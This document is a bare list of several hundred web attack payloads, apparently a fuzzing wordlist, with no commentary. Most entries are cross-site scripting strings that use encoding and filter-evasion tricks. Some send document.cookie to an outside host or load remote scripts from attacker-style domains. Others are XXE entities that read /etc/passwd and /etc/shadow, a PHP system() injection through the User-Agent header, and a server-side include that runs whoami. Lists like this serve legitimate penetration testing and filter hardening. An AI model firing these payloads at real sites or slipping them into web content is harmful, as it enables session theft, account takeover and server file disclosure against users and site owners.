&kw=%27;alert%28%27XSS%27%29;//
"<BR SIZE=""&{alert(1)}"">"
"<button onclick=""window.open('http://xss.cx/::Error138 ');"">CLICKME"
"<IFRAME SRC=""javascript:alert(\'XSS\');""></IFRAME>"
"""<STYLE>li {list-style-image: url(""""javascript:alert('XSS')"""");}</STYLE><UL><LI>XSS"""
<svg/onload=eval(atob(location.hash.slice(1)))>#YWxlcnQoMSkvLw==
1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>
">""'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;confirm(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>"
javascript&#x3A;alert(1)
<a/href=java&Tab;script:confirm%28/XSS/%29>click</a>
"&alphabet=""><script>alert(String.fromCharCode(88,83,83))</script>"
"<script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>"
"5"";+echo+""PHP Code"";+$aaa="""
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
"<!a foo=x=`y><img alt=""`><img src=x:x onerror=alert(2)//"">"
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
<font style='color:expression(alert('XSS'))'>
<scr%00ipt%20&message=> alert(â€˜Xâ€™)</script>
"""><script>document.body.innerHTML=""<a onmouseover%0B=location='\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x61\x6C\x65\x72\x74\x26\x6C\x70\x61\x72\x3B\x31\x26\x72\x70\x61\x72\x3B'><input name=attributes>"";</script>"
expr\65 ssion(URL=0)
"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();"
Ã¬><sÃ®%2bÃ®cript>alert(document.cookie)</script>
"<a href=""\\xE2\\x81\\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<BODY ONLOAD=alert(1)>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('CrossSiteScripting')></OBJECT>
'><A CLASS=X></A>
"&lt;SCRIPT/X SRC=""http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp""&gt;&lt;/SCRIPT&gt;"
"""><SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://127.0.0.1:3555/xss_serve_payloads/X.js""></SCRIPT>"
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
"<script>document.write(""<img src=//xss.cx/"" + document.cookie + "">"")</script>"
"<link rel=""import"" href=""//xss.cx"">"
"<img \\x11src=x onerror=""javascript:alert(1)"">"
window.name='hacked';location.replace('about:blank');
<!-- -- --><script>document.cookie=true;</script><!-- -- -->
'><body onload=prompt(1);>
"""`\'><script>-javascript:alert(1)</script>"
"""`'><script>\x0Ajavascript:alert(1)</script>"
<script itworksinallbrowsers>/*<script* */confirm(1)</script
&o=%22%3E%3Cscript%3Evar%20asd='&id=';alert(document.cookie)%3C/script%3E&c=1&v=2&xc=A7E3B9E1#
"""><i[%00]mg onerror=alert(1) src=a>"
<Q%^&*(Â£@!â€™â€ style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
"-1<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">"
"<img src onerror /"" \'""= alt=alert(1)//"">"
'/onmouseover='alert(1);'/a=
<script>alert(123)</script>
"<SCRIPT/SRC=""http:&#47;&#47;xss.rocks/xss.js""></SCRIPT>"
<a href=javascript:alert(1)>click
"""><script>"""
"<img src=""x:Ã¶"" title=""onerror=alert(1)//"">"
<menu id=x contextmenu=x onshow=alert(1)>right click me!
"-1<IMG SRC=""javascript:document.cookie=true;"">"
<style>body{background-color:expression\(alert(1))}</style>
<object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf
"""><STYLE>@import""javascript:confirm(document.location)"";</STYLE>"
"<a href=""about:<script>document.cookie=true;</script>"">"
&ch=Hardware&search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E
a=<a><b>%3c%69%6d%67%2f%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e</b></a>document.write(unescape(a..b))
"ABC<div style=""x:\\xE2\\x80\\x82expression(javascript:alert(1)"">DEF"
">""<<script>document.cookie=true;</script>"
vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
"&cmd=browse&project=999999.9%27%22%3E%3CA%20onmouseover=alert%28/XSSPOSED/%29%3EXSS,%20needs%20to%20be%20fixed%20ASAP%3C/a%3E"
"&lt;A HREF=\\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\""&gt;XSS&lt;/A&gt;"
'><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
<svg><script xss>\u0061l\u0065rt`X`</script>
"javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>"">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>"""
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
"""><div style=width:1px;filter:glow onfilterchange=alert(1)>x"
"<INPUT+TYPE=""checkbox""+onDblClick=confirm(XSS)>"
"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();"
<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
"""><img src=""blah""onmouseover=""alert(1);"">"
'><script>eval(â€˜alâ€™+â€™ert(1)â€™);</script>
"""><scri<script></script>pt>confirm(document.cookie);</scri<script></script>pt>"
"<!--#echo var=""http_accept"" -->"
"""%26prompt(9)%26"""
"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>â€‹"
"<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">"
"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"'><script\x09type=""text/javascript"">javascript:alert(1);</script>"
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>"
"<svg xmlns=""http://www.w3.org/2000/svg"" id=""foo""><x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/></svg>"
"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF"
"'><script>alert(1)</script>""` `>"
%253Csvg%2520onload%253D%2522confirm%25287%2529%2522%253E
"<a href=""about:<script>alert(1);</script>"
<svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>
500);alert(1);//
<form><button formaction=javascript&colon;alert(1)>CLICKME
&#X003c
<script/v>confirm(/@jackmasa/)</script>
"""></script><script>prompt(1)</script>"
"</script ""/*'/*><svg */; onload=alert(1) //>"
&queryText=%22/%3E%3CscRipt%3Ealert%28%22XSS%22%29%3C/scRipt%3E
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;
"'><img[a][b]src=x[d]onerror[c]=[e]""prompt(1)"">"
<svg><script ?>alert(1)
<script\x00>javascript:alert(1)</script>
'><script>alert(\'\\/\\1\\/\\\')</script>
<x%09onxxx=1
"<script>  (function (o) {   function exploit(x) {    if (x !== null)     confirm('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>"
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">"
"&month=dec&yr=""><script>alert(document.cookie)</script>"
"""<A HREF=""""//www.google.com/"""">XSS</A>"""
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
<input type=hidden onformchange=confirm(1)/>
<a onmouseover=location=â€™javascript:alert(1)>click
"'></SCRIPT>â€>â€™><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>"
"<A HREF=""http://66.102.7.147/"">XSS</A>"
"<STYLE>li {list-style-image: url(""javascript:alert('CrossSiteScripting')"");}</STYLE><UL><LI>CrossSiteScripting"
"'><var onmouseover=""prompt(1)"">X</var>"
'><scrip<script>t>alert(1)</script>
<img onerror=â€alert(1)â€src=a>
&#x003e
&#60;SCRIPT SRC&#61;&#47;&#47;testsite.com&#47;.j&#62;
"<body onkeyup body onkeyup=""javascript:javascript:alert(1)""></body onkeyup>"
"<xsl:stylesheet version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"" xmlns:php=""http://php.net/xsl""><xsl:template match=""/""><xsl:copy-of select=""document('/etc/passwd')""/></xsl:template></xsl:stylesheet>"
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){confirm(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>"
"""><image src=""javascript:alert(1)"">"
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
&#X0003c;
add topic <iframe src=http://www.vulnerability-lab.com>
""";location=location.hash)//#0={};alert(0)"
"""""+{toString:alert}"
"ABC<div style=""x:\\xE2\\x80\\x80expression(javascript:alert(1)"">DEF"
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"""
&foo;
&mode=singleimage&handle=AdamGirard&number=%22%3E%3Cscript%3Ealert%28%22XSSPOSED%22%29%3C/script%3E
"<a href=""javascript://%0d(0===0&&1==1)%0c?alert(1):confirm(2)"">click</a>"
<!--[if]><script>javascript:alert(1)</script -->
'><STYLE>@im\port'\ja\vasc\ript:alert(1)';</STYLE>
"""<<SCRIPT>alert(""""XSS"""");//<</SCRIPT>"""
"&lt;SCRIPT a=\\""&gt;\\"" SRC=\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\""&gt;&lt;/SCRIPT&gt;"
<<scr\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script
</script><script>confirm(3)</script>
"<script>//jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e</script>"
"&Amount=';alert(/XSSPOSED)//\\';alert(1)//"";alert(2)//\\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//"";alert(2)//\\"";alert(3)//--></SCRIPT>"">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}"");}alert(6);function+xss(){//&From=USD&To=EUR"
<script>alert(1234)</script>
\xc5\xbescriptualert(EXSSE)\xc5\xbe/scriptu
\x3E
"<script src=""/\%(jscript)s""></script>"
"<a+href=""javas&#99;ript&#35;alert(1);"">"
"<IMG SRC=""jav    ascript:javascript:alert(1);"">"
%0a{}*{background:red}
"'""`><script>/* **chr*log(*num*)// */</script>"
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>"
 autofocus onkeyup='javascript:alert(123)
"<a href=""\\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"""><img src=â€<img src=xâ€/onerror=alert(1)//â€> Jquery: <img/src/onerror=alert(1)>"
&q=%22;alert%280%29//&proxystylesheet=sp-us&site=sp-us
"""><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>"
"'><IMG LOWSRC=""javascript:alert(1)"">"
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>"
"<form><input type=""image"" value=""submit"" formaction=//goo.gl/nlX0P>"
"""><script\x0Atype=""text/javascript"">javascript:alert(1);</script>"
<u oncopy=alert()> Copy me</u>
"""<img dynsrc=""""javascript:document.write(""""XSS-XSS-XSS"""");"""">"""
<IMG SRC=javascript:confirm(&quot;XSS&quot;)>
"<pre><!--#exec cmd=""whoami""--></pre>"
"<dialog open="""" onclose=""alert(1)""><form method=""dialog""><button>Close me!</button></form></dialog>"
"""><!ENTITY x ""&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;"">"
'><object/data=//goo.gl/nlX0P>
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/shadow"" >]>"
"""/><textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));confirm(ta.value.match(/cookie = '(.*?)'/)[1])</script>"
"<?xml-stylesheet type=""text/css""?><!DOCTYPE x SYSTEM ""test.dtd""><x>&x;</x>"
"-1<IMG SRC=""  javascript:document.cookie=true;"">"
'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
top['al\\145rt'](1)
"'><A HREF=""http://google:127.0.0.1:3555/xss_serve_payloads/X.html"">X</A>"
"<div style=""list-style:url(http://foo.f)\\20url(javascript:alert(1));"">X</div>"
&Search=abc123<%2Ftitle><script>alert('1')<%2Fscript>&Option=All&Find=Find
%foo;
[<script>]=*confirm(1)</script>
xss=<link rel=import href=http://xss.cx/xss.js >
<script>confirm(9)</script>
"<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(""XSS"")>"
"<img src=""javascript:alert('XSS');"">"
<!-- --!><script>alert(X)</script>-->
"<A/HREF=""javascript:confirm(1)"">"
&#60;SCRIPT&#62;alert&#40;&#39;XSS&#39;&#41;&#60;&#47;SCRIPT&#62;
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
<script src=//brutelogic.com.br/1.js>
</SCRIPT>â€>â€><SCRIPT>prompt(1)</SCRIPT>
"<script>     function b() { return Safe.get(); } confirm(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>"
"&collection=81""><script>alert(String.fromCharCode(88,83,83))</script>"
<svg/onload=location=/java/.source+/script/.source+location.h ash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.has h[3]//#:()
"<audio src=""data:audio/mp3,%FF%F3%84%C4%FF%F3%14% C4"" oncanplay=""alert(1)"">"
<i/style=x=x/**/(confirm(1))('\')expression\')>
&from=pooptato&to=<font%20color=00ff00><marquee%20BEHAVIOR=ALTERNATE%20BGColor=black><plaintext>
"<EMBED SRC=""http://127.0.0.1:3555/xss_serve_payloads/flash.swf""></EMBED>"
';location='javascript://'%2Blocation.hash;'
"<img src=""x` `<script>javascript:alert(1)</script>""` `>"
<script type=text/vbscript>msgbox document.location</script> // IE 10
&#x000003c;
${@print(system($_SERVER['HTTP_USER_AGENT']))}
<object onfocus=popup=1;>
'><b <script>alert(1)//</script>0</script></b>
<script src=//3334957647/1>
"""`\'><script>\\x0Bjavascript:alert(1)</script>"
"<svg><![CDATA[><imagexlink:href=""]]><img/src=xx:xonerror=alert(2)//""></svg> // By Secalert"
"alert(String.fromCharCode(75,67,70))//"";alert(String.fromCharCode(75,67,70))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>"
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
httP://aa'><script>alert(123)</script>
"exp/*<A STYLE='no\X:noX(""*//*"");X:ex/*X*//*/*/pression(alert(""X""))'>"
"<![C b=""c"">"
"<script> function foo(elem, doc, text) { elem.onclick = function (e) { e.__defineGetter__(text[0], function () { return true }) alert(Safe.get()); }; var event = doc.createEvent(text[1]); event.initEvent(text[2], true, true); elem.dispatchEvent(event); } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #"
'><img src=X onerror=alert(1)>
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
&utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+zdnet%2Fsecurity+%28ZDNet+Zero+Day%29&utm_content=Google+Reader
"<video><source o?UTF-8?Q?n?error=""confirm(1)"">"
"'><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>"
with(document.__parent__)alert(1)
&#X03c
"javascr%0d%0aipt%3Aalert.call(this,%20document.domain)"
"<img src\x09=x onerror=""javascript:alert(1)"">"
"""><link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d"
&#60;LAYER SRC&#61;&#34;http&#58;&#47;&#47;testsite.com&#47;scriptlet.html&#34;&#62;&#60;&#47;LAYER&#62;
"<?xml version=""1.0""?> x><payload><![CDATA[<img src=x onerror=alert(1)>]]></payload></x>"
"""><script/src=data:,alert(1)-"">"
&search_string=%22%3E%3Cscript/xss%3Ealert%28/XSSPOSED/%29%3C/script/xss%3E
<%0bscript>alert(1);</script>
<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#"
&#x0003e;
"'><applet code=""javascript:confirm(1);"">"
"""'""><s/000 ""'""><s/000"
"""<IMG%20SRC=""""javascript:alert('WXSS')"""""""
"<a href=""javascript\\x0D:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
<SCRIPT SRC=http://xss.cx/xss.js?<B>
"ABC<div style=""x:\x20expression(javascript:alert(1)"">DEF"
{{0[a='constructor'][a]('alert(1)')()}}
"""<IFRAME SRC=""""javascript:alert('XSS');""""></IFRAME>"""
<<scr\0ipt/src=http://xss.com/xss.js></script
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">"
"""><LAYER SRC=""javascript:alert(1);""></LAYER>"
"&lt;IMG SRC=""mocha:[code]""&gt;"
"<x:template xmlns:x=""http://www.wapforum.org/2001/wml""  x:ontimer=""$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(1)""><x:timer value=""1""/></x:template>"
&q=%22%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E
"'><SPAN DATASRC=""#X"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
"&name=%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%27;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//\\%22;alert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2871,117,105,100,111,90,32,88,83,83%29%29%3C/SCRIPT%3E&size=XSS-by-GuidoZ"
"""><video poster=prompt(1)//></video>"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>"
"<INPUT TYPE=""IMAGE"" SRC=""javascript:confirm(document.location);"">"
"<script src=""#"">{alert(1)}</script>;1"
"'><A HREF=""javascript:document.location='http://127.0.0.1:3555/xss_serve_payloads/X.html'"">X</A>"
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
"â€˜;alert(String.fromCharCode(75,67,70));â€™"
